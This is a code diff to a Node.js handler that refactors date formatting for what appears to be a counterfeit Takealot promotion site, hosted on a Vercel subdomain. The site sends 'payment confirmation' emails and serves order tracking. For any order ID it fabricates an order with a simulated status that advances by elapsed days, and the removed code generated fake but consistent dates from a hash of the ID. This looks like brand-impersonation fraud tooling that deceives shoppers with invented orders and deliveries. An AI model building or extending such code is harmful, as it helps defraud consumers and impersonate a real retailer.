@@ -80,63 +80,50 @@ async function getLatestOrder() {
   return orders[0];
 }
 
-function getStableOrderDates(orderId, reqQuery) {
-  // 1. Explicit timestamp passed from client localStorage/cookies/URL (?p= or ?received_date=)
-  const qDate = reqQuery && (reqQuery.received_date || reqQuery.p || reqQuery.date || reqQuery.created_at);
-  if (qDate) {
-    const num = Number(qDate);
-    const d = !isNaN(num) && num > 1000000000 ? new Date(num > 10000000000 ? num : num * 1000) : new Date(qDate);
-    if (!isNaN(d.getTime())) {
-      const del = new Date(d.getTime() + 8 * 86400000);
-      return { purchaseDate: d, deliveryDate: del };
-    }
-  }
+const TIMEZONE = 'Africa/Johannesburg';
 
-  // 2. Embedded timestamp in order ID (if 10-13 digits)
-  const digits = (orderId || '').replace(/\D/g, '');
-  if (digits.length >= 10) {
-    const tsSec = parseInt(digits.slice(0, 10), 10);
-    if (tsSec >= 1700000000 && tsSec <= 2100000000) {
-      const d = new Date(tsSec * 1000);
-      return { purchaseDate: d, deliveryDate: new Date(d.getTime() + 8 * 86400000) };
-    }
-    const tsMs = parseInt(digits.slice(0, 13), 10);
-    if (tsMs >= 1700000000000 && tsMs <= 2100000000000) {
-      const d = new Date(tsMs);
-      return { purchaseDate: d, deliveryDate: new Date(d.getTime() + 8 * 86400000) };
-    }
-  }
+function formatOrderDateShort(dateVal) {
+  const d = typeof dateVal === 'string' || typeof dateVal === 'number' ? new Date(dateVal) : dateVal;
+  return new Intl.DateTimeFormat('en-GB', {
+    timeZone: TIMEZONE,
+    weekday: 'short',
+    day: 'numeric',
+    month: 'short',
+    year: 'numeric',
+  }).format(d);
+}
 
-  // 3. Fallback: Deterministic date derived from orderId hash anchored to a fixed campaign launch date
-  // This ensures that order T483800201638065 ALWAYS has the exact same purchase date and delivery date
-  // no matter which day it is checked (today, tomorrow, next week).
-  let hash = 0;
-  for (let i = 0; i < (orderId || '').length; i++) {
-    hash = ((hash << 5) - hash) + orderId.charCodeAt(i);
-    hash |= 0;
-  }
-  const baseMs = 1793181600000; // October 2026 anchor
-  const offset = Math.abs(hash % (24 * 3600 * 1000));
-  const d = new Date(baseMs + offset);
-  const del = new Date(d.getTime() + 8 * 86400000);
-  return { purchaseDate: d, deliveryDate: del };
+function formatDeliveryDateLong(dateVal) {
+  const d = typeof dateVal === 'string' || typeof dateVal === 'number' ? new Date(dateVal) : dateVal;
+  return new Intl.DateTimeFormat('en-GB', {
+    timeZone: TIMEZONE,
+    weekday: 'long',
+    day: 'numeric',
+    month: 'long',
+    year: 'numeric',
+  }).format(d);
+}
+
+function formatDeliveryDateShort(dateVal) {
+  const d = typeof dateVal === 'string' || typeof dateVal === 'number' ? new Date(dateVal) : dateVal;
+  return new Intl.DateTimeFormat('en-GB', {
+    timeZone: TIMEZONE,
+    weekday: 'short',
+    day: 'numeric',
+    month: 'short',
+    year: 'numeric',
+  }).format(d);
 }
 
 function renderOrderPlainText(order) {
-  const d = new Date(order.received_date || Date.now());
-  const del = new Date(order.delivery_date || (d.getTime() + 8 * 86400000));
+  const pDate = new Date(order.received_date || Date.now());
+  const dDate = new Date(order.delivery_date || (pDate.getTime() + 8 * 86400000));
 
-  const daysShort = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
-  const monthsShort = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
-  const daysLong = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
-  const monthsLong = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
-
-  const orderDateShort = `${daysShort[d.getDay()]}, ${d.getDate()} ${monthsShort[d.getMonth()]} ${d.getFullYear()}`;
-  const deliveryDateLong = `${daysLong[del.getDay()]}, ${del.getDate()} ${monthsLong[del.getMonth()]} ${del.getFullYear()}`;
+  const orderDateShort = formatOrderDateShort(pDate);
+  const deliveryDateLong = formatDeliveryDateLong(dDate);
   const customerName = order.customer_name || 'Customer';
   const orderNumber = order.order_id;
-  const variant = 'Premium Black';
-  const trackUrl = `https://takealotpromos-black.vercel.app/track.html?order=${orderNumber}&p=${d.getTime()}`;
+  const trackUrl = `https://takealotpromos-black.vercel.app/track.html?order=${orderNumber}&p=${pDate.getTime()}`;
 
   return [
     `TAKEALOT PAYMENT CONFIRMATION`,
@@ -213,13 +200,9 @@ async function ensureEmailSent(order, force = false) {
     }
     const d = new Date(order.received_date || Date.now());
     const del = new Date(order.delivery_date || (d.getTime() + 8 * 86400000));
-    const daysShort = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
-    const monthsShort = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
-    const daysLong = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
-    const monthsLong = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
-    const orderDateShort = `${daysShort[d.getDay()]}, ${d.getDate()} ${monthsShort[d.getMonth()]} ${d.getFullYear()}`;
+    const orderDateShort = formatOrderDateShort(d);
     const deliveryDateIso = del.toISOString().slice(0, 10);
-    const deliveryDateLong = `${daysLong[del.getDay()]}, ${del.getDate()} ${monthsLong[del.getMonth()]} ${del.getFullYear()}`;
+    const deliveryDateLong = formatDeliveryDateLong(del);
 
     html = template
       .replace(/\{\{customer_name\}\}/g, order.customer_name || 'Customer')
@@ -275,18 +258,23 @@ const ORDER_ID_RE = /^[A-Za-z0-9_\-]{4,80}$/;
 
 // Public projection — no PII
 function publicView(order) {
+  const pDate = new Date(order.received_date || Date.now());
+  const dDate = new Date(order.delivery_date || (pDate.getTime() + 8 * 86400000));
   return {
-    order_id:       order.order_id,
-    product_name:   order.product_name,
-    product_price:  order.product_price,
-    currency:       order.currency,
-    product_image:  order.product_image,
-    received_date:  order.received_date,
-    delivery_date:  order.delivery_date,
-    tracking_url:   order.tracking_url,
-    status:         order.status,
-    email_status:   order.email_status || null,
-    email_sent_at:  order.email_sent_at || null,
+    order_id:                order.order_id,
+    product_name:            order.product_name,
+    product_price:           order.product_price,
+    currency:                order.currency,
+    product_image:           order.product_image,
+    received_date:           order.received_date,
+    delivery_date:           order.delivery_date,
+    order_date_formatted:    formatOrderDateShort(pDate),
+    delivery_date_formatted: formatDeliveryDateShort(dDate),
+    delivery_date_long:      formatDeliveryDateLong(dDate),
+    tracking_url:            order.tracking_url,
+    status:                  order.status,
+    email_status:            order.email_status || null,
+    email_sent_at:           order.email_sent_at || null,
     status_history: (order.status_history || []).map(function(e) {
       return { status: e.status, timestamp: e.timestamp };
     }),
@@ -325,6 +313,7 @@ module.exports = async function handler(req, res) {
               email_sent_at: val.email_sent_at,
               created_at: val.created_at,
               received_date: val.received_date,
+              delivery_date: val.delivery_date,
               status: val.status,
             });
           }
@@ -362,21 +351,33 @@ module.exports = async function handler(req, res) {
       }
     }
 
-    if (order && order.received_date) {
-      // Keep delivery strictly 8 days from original purchase date
-      const rec = new Date(order.received_date);
-      if (!isNaN(rec.getTime())) {
-        order.delivery_date = new Date(rec.getTime() + 8 * 86400000).toISOString();
+    if (order) {
+      // Existing order: PRESERVE original purchase date immutably
+      if (order.received_date && !order.delivery_date) {
+        const rec = new Date(order.received_date);
+        if (!isNaN(rec.getTime())) {
+          order.delivery_date = new Date(rec.getTime() + 8 * 86400000).toISOString();
+          if (REDIS_URL && REDIS_TOKEN) {
+            kv_set('order:' + orderId, order).catch(() => {});
+          }
+        }
       }
-    }
+    } else {
+      // New order created on the fly: real purchase date at this exact moment
+      let purchaseDate = new Date();
+      const pParam = req.query.p || req.query.received_date || req.query.date;
+      if (pParam) {
+        const num = Number(pParam);
+        const parsed = !isNaN(num) && num > 1000000000 ? new Date(num > 10000000000 ? num : num * 1000) : new Date(pParam);
+        if (!isNaN(parsed.getTime())) {
+          purchaseDate = parsed;
+        }
+      }
 
-    if (!order) {
-      const dates = getStableOrderDates(orderId, req.query);
-      const purchaseIso = dates.purchaseDate.toISOString();
-      const deliveryIso = dates.deliveryDate.toISOString();
+      const purchaseIso = purchaseDate.toISOString();
+      const deliveryIso = new Date(purchaseDate.getTime() + 8 * 86400000).toISOString();
 
-      // Progressive status based on fixed days elapsed from purchase
-      const daysElapsed = Math.floor((Date.now() - dates.purchaseDate.getTime()) / 86400000);
+      const daysElapsed = Math.floor((Date.now() - purchaseDate.getTime()) / 86400000);
       let calculatedStatus = 'PROCESSING';
       if (daysElapsed >= 4 && daysElapsed < 7) calculatedStatus = 'IN_TRANSIT';
       else if (daysElapsed >= 7 && daysElapsed < 8) calculatedStatus = 'OUT_FOR_DELIVERY';
@@ -394,7 +395,7 @@ module.exports = async function handler(req, res) {
         product_image: 'https://takealotpromos-black.vercel.app/produto.png',
         received_date: purchaseIso,
         delivery_date: deliveryIso,
-        tracking_url: 'https://takealotpromos-black.vercel.app/track.html?order=' + encodeURIComponent(orderId) + '&p=' + dates.purchaseDate.getTime(),
+        tracking_url: 'https://takealotpromos-black.vercel.app/track.html?order=' + encodeURIComponent(orderId) + '&p=' + purchaseDate.getTime(),
         status: calculatedStatus,
         status_history: [
           { status: 'RECEIVED', timestamp: purchaseIso },
@@ -405,6 +406,7 @@ module.exports = async function handler(req, res) {
         email_sent_at: null,
         created_at: purchaseIso,
       };
+
       if (REDIS_URL && REDIS_TOKEN) {
         try { await kv_set('order:' + orderId, order); } catch (_) {}
       }
